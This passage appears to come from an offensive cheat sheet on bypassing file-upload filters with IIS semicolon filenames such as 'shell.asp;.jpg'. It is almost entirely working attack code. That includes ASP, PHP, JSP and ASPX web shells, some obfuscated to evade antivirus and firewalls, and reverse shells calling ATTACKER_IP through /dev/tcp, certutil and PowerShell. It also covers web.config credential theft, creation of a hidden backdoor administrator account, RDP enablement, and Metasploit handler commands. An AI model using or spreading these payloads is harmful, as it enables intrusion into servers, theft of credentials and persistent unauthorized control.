  # Trigger bash reverse shell (Linux)
  curl "https://target.com/uploads/shell.php;.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
  ```

  ```bash
  # Trigger via certutil download (Windows)
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=certutil+-urlcache+-f+http://ATTACKER_IP/nc.exe+C:\\Windows\\Temp\\nc.exe+%26%26+C:\\Windows\\Temp\\nc.exe+ATTACKER_IP+4444+-e+cmd.exe"
  ```
  :::

  :::tabs-item{label="Data Exfiltration"}
  ```bash
  # Read web.config for credentials
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=type+C:\\inetpub\\wwwroot\\web.config"
  ```

  ```bash
  # Read connection strings
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=findstr+/si+password+C:\\inetpub\\wwwroot\\*.config"
  ```

  ```bash
  # List files in web root
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=dir+C:\\inetpub\\wwwroot+/s+/b"
  ```

  ```bash
  # Dump IIS configuration
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe+list+site+/config"
  ```

  ```bash
  # Network enumeration
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=netstat+-an"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=arp+-a"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=net+user"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=net+localgroup+administrators"
  ```
  :::

  :::tabs-item{label="Persistence"}
  ```bash
  # Upload additional backdoor to less monitored location
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=echo+^<%25=CreateObject(\"WScript.Shell\").Exec(\"cmd+/c+\"+%26+Request(\"c\")).StdOut.ReadAll%25^>+>+C:\\inetpub\\wwwroot\\error\\404.asp"
  ```

  ```bash
  # Create a new admin user
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=net+user+backdoor+P@ssw0rd123+/add"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=net+localgroup+administrators+backdoor+/add"
  ```

  ```bash
  # Enable RDP
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=reg+add+\"HKLM\\System\\CurrentControlSet\\Control\\Terminal+Server\"+/v+fDenyTSConnections+/t+REG_DWORD+/d+0+/f"
  ```
  :::
::

---

## Payload Encoding & Obfuscation

::accordion
  :::accordion-item{label="Base64 Encoded ASP Shell"}
  ```bash
  # Encode payload
  echo '<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>' | base64
  
  # Upload encoded, decode at runtime
  # Self-decoding ASP payload
  cat > encoded_shell.asp << 'EOF'
  <%
  Dim decoded
  decoded = Base64Decode("PCU9Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuRXhlYygiY21kIC9jICIgJiBSZXF1ZXN0KCJjbWQiKSkuU3RkT3V0LlJlYWRBbGwlPg==")
  Execute(decoded)
  %>
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@encoded_shell.asp;filename=encoded.asp;.jpg"
  ```
  :::

  :::accordion-item{label="Hex Encoded PHP Shell"}
  ```bash
  # PHP hex-encoded execution
  cat > hex_shell.php << 'EOF'
  <?php
  $h = "73797374656d"; // "system" in hex
  $f = hex2bin($h);
  $f($_GET['cmd']);
  ?>
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@hex_shell.php;filename=shell.php;.jpg"
  ```
  :::

  :::accordion-item{label="Variable Function ASP Evasion"}
  ```asp
  <%
  Dim obj_name, method_name
  obj_name = "WScr" & "ipt.Sh" & "ell"
  Set obj = Server.CreateObject(obj_name)
  Dim exec_result
  Set exec_result = obj.Exec("cm" & "d /c " & Request("cmd"))
  Response.Write(exec_result.StdOut.ReadAll)
  %>
  ```
  :::

  :::accordion-item{label="Char Code Concatenation PHP"}
  ```php
  <?php
  // s-y-s-t-e-m
  $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
  $f($_GET['cmd']);
  ?>
  ```
  :::

  :::accordion-item{label="JSP Reflection Bypass"}
  ```jsp
  <%@ page import="java.lang.reflect.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Class rt = Class.forName("java.lang.Runtime");
    Method grt = rt.getMethod("getRuntime");
    Object runtime = grt.invoke(null);
    Method exec = rt.getMethod("exec", String.class);
    Process p = (Process) exec.invoke(runtime, cmd);
    java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
  %>
  ```
  :::
::

---

## WAF Bypass Strategies

::caution
Web Application Firewalls may detect upload payloads. Use these techniques to evade detection.
::

::tabs
  :::tabs-item{label="Chunked Transfer"}
  ```bash
  # Use chunked transfer encoding to split the payload
  curl -X POST https://target.com/upload \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Type: multipart/form-data; boundary=----Bound" \
    --data-binary @- << 'EOF'
  ------Bound
  Content-Disposition: form-data; name="file"; filename="shell.asp;.jpg"
  Content-Type: image/jpeg

  <%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>
  ------Bound--
  EOF
  ```
  :::

  :::tabs-item{label="Multipart Boundary Manipulation"}
  ```bash
  # Unusual boundary characters
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=AAAA\xBBBBB" \
    --data-binary $'--AAAA\xBBBBB\r\nContent-Disposition: form-data; name="file"; filename="shell.asp;.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>\r\n--AAAA\xBBBBB--'
  ```

  ```bash
  # Extra whitespace in boundary
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data;   boundary=----Bound" \
    -H "Content-Type:  multipart/form-data ; boundary=----Bound" \
    --data-binary @payload.txt
  ```
  :::

  :::tabs-item{label="Request Smuggling Combo"}
  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Length: 350
  Transfer-Encoding: chunked
  Content-Type: multipart/form-data; boundary=----Bound

  186
  ------Bound
  Content-Disposition: form-data; name="file"; filename="shell.asp;.jpg"
  Content-Type: image/jpeg

  <%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>
  ------Bound--
  0
  ```
  :::

  :::tabs-item{label="Payload Fragmentation"}
  ```asp
  <%
  ' Fragment the dangerous strings
  Dim a, b, c
  a = "WScr"
  b = "ipt."
  c = "Shell"
  Set s = Server.CreateObject(a & b & c)
  Dim d, e
  d = "cmd"
  e = " /c "
  Set r = s.Exec(d & e & Request("cmd"))
  Response.Write(r.StdOut.ReadAll)
  %>
  ```
  :::
::

---

## Detection & Validation Mapping

Understanding what the target checks helps you choose the right bypass.

::collapsible

| Validation Type | What It Checks | Semicolon Bypass Effective? | Notes |
| --- | --- | --- | --- |
| Extension Blacklist | Last extension after `.` | Yes | Filter sees `.jpg`, server executes `.asp` |
| Extension Whitelist | Last extension must be in allowed list | Yes | Same mismatch logic |
| Content-Type Header | `Content-Type` in multipart | Partially | Combine with MIME spoofing |
| Magic Bytes | First bytes of file content | No (alone) | Must prepend valid magic bytes |
| File Size | Maximum file size | N/A | Shells are typically small |
| Image Reprocessing | GD, ImageMagick re-render | No | Payload destroyed on reprocessing |
| Filename Sanitization | Strips special characters | No | Semicolon gets removed |
| Random Rename | Server renames file | No | Extension may also change |
| Path Randomization | Uploads to random directory | Partial | Must discover the path |
| Virus Scanning | ClamAV, Windows Defender | Partial | Use obfuscated payloads |

::

---

## Request Flow Diagram

::code-preview
```
┌──────────────────────────────────────────────────────┐
│                    ATTACKER                          │
│                                                      │
│  Payload: shell.asp;.jpg                             │
│  Content: ASP webshell code                          │
│  Content-Type: image/jpeg                            │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│              UPLOAD ENDPOINT                         │
│                                                      │
│  1. Receives multipart POST                          │
│  2. Extracts filename: shell.asp;.jpg                │
│  3. Extension check: splits on "." → gets "jpg"     │
│  4. Validation: jpg ∈ allowed_list → PASS            │
│  5. Content-Type: image/jpeg → PASS                  │
│  6. Saves file as: shell.asp;.jpg                    │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│              FILE STORAGE                            │
│                                                      │
│  /uploads/shell.asp;.jpg                             │
│  Stored on disk with original name                   │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│              IIS WEB SERVER                          │
│                                                      │
│  Request: GET /uploads/shell.asp;.jpg?cmd=whoami     │
│                                                      │
│  1. Parses URL path                                  │
│  2. Encounters ";" → treats as parameter delimiter   │
│  3. Resolves filename: shell.asp                     │
│  4. Maps to ASP handler                              │
│  5. EXECUTES as Active Server Page                   │
│  6. Returns command output                           │
└──────────────────────────────────────────────────────┘
```

#code
```
Attacker → Upload (shell.asp;.jpg) → Filter sees .jpg → PASS
→ Saved as shell.asp;.jpg → IIS parses as shell.asp → CODE EXECUTION
```
::

---

## Filename Mutation Matrix

::collapsible

| Mutation | Filename | Target Server | Success Rate |
| --- | --- | --- | --- |
| Basic semicolon | `shell.asp;.jpg` | IIS 6.0 | High |
| Named parameter | `shell.asp;param=val.jpg` | IIS 6.0/7.x | High |
| Multiple semicolons | `shell.asp;;;;;.jpg` | IIS 6.0 | Medium |
| Semicolon + null byte | `shell.asp;%00.jpg` | IIS 6.0 + PHP < 5.3.4 | Medium |
| URL-encoded semicolon | `shell.asp%3B.jpg` | Varies | Low-Medium |
| Double-encoded semicolon | `shell.asp%253B.jpg` | Proxy chains | Low |
| Unicode semicolon | `shell.asp；.jpg` | Custom parsers | Low |
| Semicolon + trailing dot | `shell.asp;.jpg.` | Windows/IIS | Medium |
| Semicolon + trailing space | `shell.asp;.jpg ` | Windows/IIS | Medium |
| Semicolon + ADS | `shell.asp;.jpg::$DATA` | Windows/IIS | Medium |
| Semicolon directory | `shell.asp;/cmd.jpg` | IIS 6.0 | High |
| Case mixed | `shell.AsP;.JpG` | IIS (case-insensitive) | High |
| Semicolon + double ext | `shell.asp;.jpg.asp` | Misconfigured | Low |
| JSP session fake | `shell.jsp;jsessionid=x.jpg` | Tomcat | Medium |
| Reverse semicolon | `shell.jpg;.asp` | Varies | Low |

::

---

## Tool-Specific Commands

::tabs
  :::tabs-item{label="Upload Scanner"}
  ```bash
  # upload-scanner (custom tool pattern)
  python3 upload_scanner.py \
    -u https://target.com/upload \
    -f shell.asp \
    --semicolon \
    --extensions jpg,png,gif \
    --threads 10
  ```
  :::

  :::tabs-item{label="Weevely (PHP)"}
  ```bash
  # Generate obfuscated PHP shell
  weevely generate P@ssw0rd /tmp/weevely_shell.php

  # Upload with semicolon bypass
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/weevely_shell.php;filename=shell.php;.jpg"

  # Connect to shell
  weevely https://target.com/uploads/shell.php;.jpg P@ssw0rd
  ```
  :::

  :::tabs-item{label="Msfvenom + Upload"}
  ```bash
  # Generate ASPX Meterpreter payload
  msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=ATTACKER_IP LPORT=4444 \
    -f aspx -o meterpreter.aspx

  # Upload with semicolon bypass
  curl -X POST https://target.com/upload \
    -F "file=@meterpreter.aspx;filename=shell.aspx;.jpg"

  # Start handler
  msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"

  # Trigger
  curl "https://target.com/uploads/shell.aspx;.jpg"
  ```
  :::

  :::tabs-item{label="Metasploit Module"}
  ```bash
  # IIS upload exploit module
  msfconsole -q
  use exploit/windows/iis/iis_webdav_upload_asp
  set RHOSTS target.com
  set RPORT 80
  set PATH /uploads/
  set FILENAME shell.asp;.jpg
  set payload windows/meterpreter/reverse_tcp
  set LHOST ATTACKER_IP
  set LPORT 4444
  exploit
  ```
  :::

  :::tabs-item{label="Commix (Command Injection Post-Upload)"}
  ```bash
  # After uploading shell, use commix for automated exploitation
  commix --url="https://target.com/uploads/shell.asp;.jpg?cmd=INJECT_HERE" \
    --technique=classic \
    --os=windows
  ```
  :::
::

---

## Cheat Sheet

::card-group
  :::card
  ---
  title: Quick Payloads
  ---
  ```bash
  # One-liner ASP
  <%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>

  # One-liner ASPX
  <%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>

  # One-liner PHP
  <?php system($_GET['cmd']); ?>

  # One-liner JSP
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
  ```
  :::

  :::card
  ---
  title: Quick Test Commands
  ---
  ```bash
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=s.asp;.jpg"

  # Trigger
  curl "https://target.com/uploads/s.asp;.jpg?cmd=whoami"

  # Verify
  curl "https://target.com/uploads/s.asp;.jpg?cmd=dir+C:\\"

  # Reverse shell
  curl "https://target.com/uploads/s.asp;.jpg?cmd=powershell+-nop+-c+\"IEX(IWR+http://ATTACKER/rev.ps1)\""
  ```
  :::

  :::card
  ---
  title: Extension Priority
  ---
  1. `.asp;.jpg` — Classic IIS bypass
  2. `.aspx;.jpg` — .NET handler
  3. `.asp;image.jpg` — Named fake file
  4. `.asp;;;;;.jpg` — Multi-semicolon
  5. `.asp;%00.jpg` — Null byte combo
  6. `.AsP;.JpG` — Case variation
  7. `.asp;.jpg.` — Trailing dot
  8. `.jsp;jsessionid=x.jpg` — Tomcat trick
  :::

  :::card
  ---
  title: Response Indicators
  ---
  - **Shell executed**: Response contains command output (username, hostname, directory listing)
  - **File saved but not executed**: Response returns raw shell code as text
  - **Upload blocked**: Error message mentioning extension, type, or validation failure
  - **404 after upload**: File saved with different name or in different location
  - **500 error on trigger**: Server recognizes the handler but payload has syntax errors
  :::
::